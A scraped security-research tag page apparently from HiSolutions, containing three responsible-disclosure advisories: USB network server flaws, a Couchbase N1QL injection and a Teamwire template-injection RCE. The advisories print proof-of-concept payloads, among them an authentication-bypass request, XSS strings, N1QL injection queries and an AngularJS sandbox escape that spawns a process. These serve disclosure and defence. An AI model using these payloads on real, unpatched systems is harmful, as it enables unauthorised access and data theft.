* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_754bf600_20250121_012418.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Schlagwort: Disclosure

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/ "High-Impact Vulnerabilites In Multiple USB Network Servers")

[15. Juli 20205. August 2020](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [High-Impact Vulnerabilites In Multiple USB Network Servers](https://research.hisolutions.com/2020/07/high-impact-vulnerabilites-in-multiple-usb-network-servers/)

Within the scope of a recent penetration test and through individual research effort, HiSolutions‘ security consultants discovered multiple previously unknown high-impact vulnerabilities in USB network server firmwares (see individual issues for the CVE IDs). Devices of multiple vendors were affected by similar vulnerabilities. HiSolutions responsibly disclosed the vulnerabilities to the vendors and additionally provided feedback on the implemented patches.

## Background Information

USB network servers or USB network MTP and printer servers are devices that can be used to make USB devices accessible to multiple users via the network. Users install a software on their client and can then access USB devices without the need to physically plug the device into the local system. If devices are used by multiple users the devices do not have to be transfered between different systems each time the user changes. Use cases include shared USB network drives, USB Printers, or USB license dongles that can be used by authenticated users on the local network. All of the investigated devices were provided with an individual client software that runs on the local systems. All systems also exposed a web server that could be used to make administrative changes to the system.

## The Vulnerabilities

HiSolutions consultants discovered four noteable vulnerabilities in each of the investigated devices.
The devices were:

* TP-Link TL-PS310U (version v2.000, fixed in 2.079.000.t0210)
* Digitus da-70254 (version 2.073.000.E0008)
* Lindy No. 42633 (version v.2.078.000)
* one other reviewed device of an (at this time) undisclosed vendor

### Exposure of the Administrative Password Over Network Broadcast

*The following CVE IDs were issued for this vulnerability: CVE-2020-15054 (TP-Link), CVE-2020-15058 (Lindy), CVE-2020-15062 (Digitus).*

The USB network servers send the password of the local administrator account repeatedly and without request across the local Network via UDP broadcast. Every system on that network can read the password from these unencrypted broadcasts. The password is sent in UDP packets to the broadcast address 255.255.255.255 as can be seen in the following packet capture:

![wireshark packet capture screenshot of administrative password in udp network traffic](data:image/gif;base64...)![wireshark packet capture screenshot of administrative password in udp network traffic](https://research.hisolutions.com/wp-content/uploads/2020/07/administrative-password-in-udp-network-traffic.jpg)
Figure 1: UDP broadcast of the administrative password „PASSWORDABC“.

All systems in the local network receive the administrative password. In theory, the password is then used to locally check against the password entered by the client on the local system. In practice, an attacker can easily retrieve the password from the UDP broadcast messages and thus
circumvent the access restrictions to the administrative interface. The attacker then can use all functions provided by the USB network server, including restricted ones. If the password is reused (which is strongly discouraged but often the case) this design error could give an attacker access to other systems that use the same password.

### Authentication Bypass in Web Administration Interface

*The following CVE IDs were issued for this vulnerability: CVE-2020-15055 (TP-Link), CVE-2020-15059 (Lindy), CVE-2020-15063 (Digitus).*

In some cases the password authentication requirement in the web interface can be bypassed when the password parameter is removed from the request. This enables an unauthenticated user to access privileged functions on the interface.
As an example, the following request will change the server name, a functionality that would normally only be available if the configured password was provided:

```
POST /csystem33.htm HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
Firefox/60.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.10/csystem33.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close
Upgrade-Insecure-Requests: 1
```
```
%24A0%24=New+Name+No+Password&%24B2%24=38&%24B3%24=39
```

As is visible in the request, no password is provided and the corresponding Parameter is removed entirely. Without the password parameter the authentication does not fail, but instead the server simply implies that no password was set, thus allowing the operation without any user authentication.

Because of that, unauthenticated users can access administrative functions on the system without knowledge of the administrative password, therefore bypassing the authentication. This effectively disables the access control for the entire administrative interface.

### Persistent Cross-Site Scripting

*The following CVE IDs were issued for this vulnerability: CVE-2020-15056 (TP-Link), CVE-2020-15060 (Lindy), CVE-2020-15064 (Digitus).*

The parameter for the server name is vulnerable to a stored Cross-Site Scripting ([XSS](https://research.hisolutions.com/2023/04/xss-auf-abwegen/)) attack. This results in the possibility for an attacker to execute JavaScript code in the context of the victims browser.

If the corresponding request is sent to the server, the server name gets embedded into the JavaScript file unfiltered and unescaped:

```
var myServer = new Server();
myServer.model = '';
myServer.manuf = '';
myServer.name = 'TestName';alert('Successful XSS');//';
myServer.hw = 'V. 2.000';
//myServer.tempFW = '2.255.255';
tempFWVersion = '';
myServer.fw = tempFWVersion.substring(0,1) + '.' +
tempFWVersion.substring(1,3);
myServer.mac = '34:e8:94:20:47:78';
```

The vulnerability allows attackers to execute JavaScript code in the context of the browser of the victim by manipulating the stored server name. Attackers in the local network could insert a custom script that is loaded each time an administrator visits the web administration interface. They can thereby gain persistent access to the web interface and attack other systems in the local network through the browser of the victim.
Normally, administrative access to the web interface would be needed to [exploit](https://research.hisolutions.com/2023/03/wir-nehmen-rtf-da-gibt-es-keine-makros-dafuer-aber-einen-exploit/) this vulnerability, which would lower the impact. In combination with other vulnerabilities (like the authentication bypass) this exploit works for all users with access to the system.

### Denial of Service

*The following CVE IDs were issued for this vulnerability: CVE-2020-15057 (TP-Link), CVE-2020-15061 (Lindy), CVE-2020-15065 (Digitus).*

Users can crash the USB network servers by sending long input values. For some lengths, the servers hang or act unexpectedly. while longer input values (e.g. 1103 characters) will crash them entirely. A reboot or sometimes reset of the device is needed to clear the issue.

After receiving too long input values the system no longer responds to network requests. The UDP broadcasts show that when setting a long server name other variables were most likely overwritten:

![Wireshark packet capture screenshot of the buffer overflow from the server name](data:image/gif;base64...)![Wireshark packet capture screenshot of the buffer overflow from the server name](https://research.hisolutions.com/wp-content/uploads/2020/07/USB-Abb3.jpg)
Figure 2: Buffer overflow from the server name (top: normal, bottom: after attack)

An attacker can use the buffer overflow vulnerability to impact the availability of the server. The shown behaviour indicates that the buffer overflow could also be used to execute functions or code on the system. This possibility was not investigated during the project.

## Remediation

The vendors TP-Link and Lindy provided an updated firmware that fixes the vulnerabilities.

When using a device for which no patch is available, make sure that the chosen password is not reused on any other system or application.
Access to the devices could also be restricted on network level to limit the possibility of an attacker accessing the web interface or sniffing the broadcast traffic.

## Responsible Disclosure Timeline

The vulnerabilities were reported to each of the vendors via e-mail. It was made clear that HiSolutions will follow defined [responsible disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) policy and aims to release information about the vulnerabilities in coordination with the vendor.
Each but one vendor reacted to the initial contact and in the following dialogue was provided with additional information on the vulnerabilities.
The vendors named in this advisory provided patches to mitigate the security issues. Hisolutions tested the patches for their effectiveness until the discovered vulnerabilities were closed and follow-up problems solved adequately.

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/Teamwire_Messenger.jpg)](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/ "Web vulnerabilities are coming to the Desktop – Template Injections lead to RCE in Teamwire")

[21. Juni 201928. Juni 2019](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [Web vulnerabilities are coming to the Desktop – Template Injections lead to RCE in Teamwire](https://research.hisolutions.com/2019/06/web-vulnerabilities-are-coming-to-the-desktop-template-injections-lead-to-rce-in-teamwire/)

**TL;DR (Teamwire users):** A vulnerability has been found in Teamwire which can allow malicious users to execute commands on victim’s computers by sending a crafted Teamwire message. Upgrade Teamwire to the newest version as soon as possible to fix this vulnerability.

**TL;DR (Technical):** Template injections are a common vulnerability in web applications. If a desktop application built on a web engine is vulnerable to template injection, this can result in remote code execution on the client system.

### **Background**

Template injection refers
to a class of vulnerabilities that [exploit](https://research.hisolutions.com/2023/03/wir-nehmen-rtf-da-gibt-es-keine-makros-dafuer-aber-einen-exploit/) the insecure embedding of user
controllable data into template engines like AngularJS. Template engines use
template files to define the design of a user interface by inserting special
placeholders into a text. The template engine then dynamically replaces the placeholders
with data at runtime, referred to as “rendering” the template. Many modern
template engines even support carrying out complex computations inside the
templates themselves. If an attacker embed one of these placeholders into a
template, he can often execute functions in the underlying programming
language.

To help support cross-platform compatibility,
software vendors started embedding web engines into client desktop
applications, thus removing the need to develop native applications for all
different client platforms. NW.js is a technology that combines the browser
engine WebKit with the JavaScript framework Node.js, and is often used to create
cross-platform applications. This combination enables users to call Node.js
functions directly from the DOM of the embedded Chromium browser.

For web applications, template injections are well known problem. Due to the increasing use of web technologies for the rapid development of client applications, this class of vulnerabilities has begun to manifest itself on the desktop too.

[Teamwire](https://www.teamwire.eu/) is a “fast, intuitive and secure enterprise messaging app” for businesses. Teamwire clients are available for iPhone, iPad, Android, Windows Phone, Windows PC, Mac OS and Linux.

HiSolutions researchers have found
two distinct template injection vulnerabilities during an internal security
assessment of the Teamwire messaging platform (clients on Windows and the administrative
interface), which could be used to target end users or platform administrators.

### **Technical Background**

Teamwire is built on AngularJS. Angular implements a secure sandbox to attempt to prevent attacks even if user input is insecurely embedded in templates. As the sandbox was [repeatedly bypassed](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs), AngularJS developers decided that the effort was futile and shifted the responsibility back to  application developers. Currently, bypasses exist for all AngularJS Versions that enable an attacker to escape from the sandbox and execute arbitrary JavaScript commands.

Template injections in AngularJS can be illustrated as follows: If an attacker succeeds in inserting placeholder string, delineated with double curly brackets ( “**{{…}}**” ) into a template inside the application, any operations inside the brackets will be carried out when the template is rendered. In this case, inserting **{{77\*77}}** into the name field (left) results in the product (**5929**) being displayed in the rendered display (right).

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/1-example-calculation.png)

The expression „77\*77“ evaluates to „5929“ when the template is rendered.

To bypass the sandbox in
AngularJS 1.6.8, which is used by Teamwire, the following template string can
be used:

***{{constructor.constructor(‚###JavaScript-Code-Here###‘)()}}***

### **Vulnerability Details**

#### Stored XXS in Admin Web Interface – CVE-2018-17560

Users can change their
displayed usernames in the Teamwire clients without any restrictions. A user could
therefore change his username to include a template string:

***his {{constructor.constructor(‚document.body.style.backgroundColor = „green“;‘)()}}***

Our researchers found
that when an administrator views the user inside the administrative web panel,
the username is embedded insecurely (i.e. without encoding the placeholder to
prevent execution) into the web page and the JavaScript code in the string is
executed.

The example payload above
only changes the background color of the HTML page, but a malicious user could
insert arbitrary JavaScript code to be executed in the browser. An attacker
could for example try to take over an administrator’s session or try to execute
actions with admin rights in the web portal.

Attempting to delete the
“malicious” user also triggers the vulnerability, as the admin must first view
the user in the web interface to be able to delete them.

#### Desktop Client RCE – CVE-2018-17170

Another template
injection was found inside the Teamwire desktop client. The vulnerable field
was the name of a group chat. A malicious user must first create a chat with a
crafted name including the template string. They can exploit this vulnerability
to execute code on the victim’s system. If another user included in the chat
writes a message to the attacker by selecting him from his contact list, the
client merges the chats and the payload is executed on the victim’s system. Because
the victim selects the other user from the contact list, he cannot see the
manipulated chat name before the JavaScript is executed.

That only the first
character of the chat names is displayed in the overview further helps to
hide  malicious payloads.

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/2-chatname-1024x328.png)

Only the first part of the chat name is shown (left), hiding the malicious part.

---

The same code execution vulnerability is
exploitable when the victim starts a chat with another user with a specially
crafted username.

Because the Teamwire
desktop client uses NW.js and the embedded Node.js has the ability to spawn
arbitrary processes, template injection actually results in remote code
execution on the client system.

This example payload opens
the windows calculator on the client system:

***{{constructor.constructor(„const x=require(‚child\_process‘).spawn; x(‚calc.exe‘);“)()}}***

![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/3-calc-spawned.png)

The template injection can even lead to code execution on the receiving client.

Due to the internal
structure of the code, the payload is executed four times when the
vulnerability is triggered by sending a message.

### **Impact and Mitigations**

The impact of the
vulnerabilities is limited by the fact that a valid user account attributed to
the organization is needed to perform the attack. If an attacker has obtained
access to an account, no mitigation against the attack in the web interface
(apart from not using it) exist. Preventing the code execution attack against
the clients requires not accepting any messages from other accounts, obviating
the purpose of a messaging application.

The vulnerabilities described above have been fixed in the backend version *prod-2018-11-13-15-00-42*and in the desktop client version 1.9.0 released on 16.11.2018. To fully mitigate the vulnerabilities and continue the use of the product, these updates should be installed as soon as possible.

The vulnerability CVE-2018-17170 has been verified for the desktop client version *1.5.1*, it affects most likely all versions prio to 1.9.0. The vulnerability CVE-2018-17560 affects all backend version prior to *prod-2018-11-13-15-00-42*.

### **Disclosure Timeline**

16. October 2018 – Initial
contact with the vendor

16. October 2018 – Submission
of vulnerability details to the vendor

22. October 2018 – Further
communication with vendor

16. November 2018 – Update released

21.  June 2019 – Public disclosure (the vendor asked for a postponed publication of the details, which we agreed on)

### Credits

The vulnerabiliy was found by Julian Beier, Lars Burhop, Benjamin Braun, Viktor Schlüter and Denis Werner (HiSolutions).

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
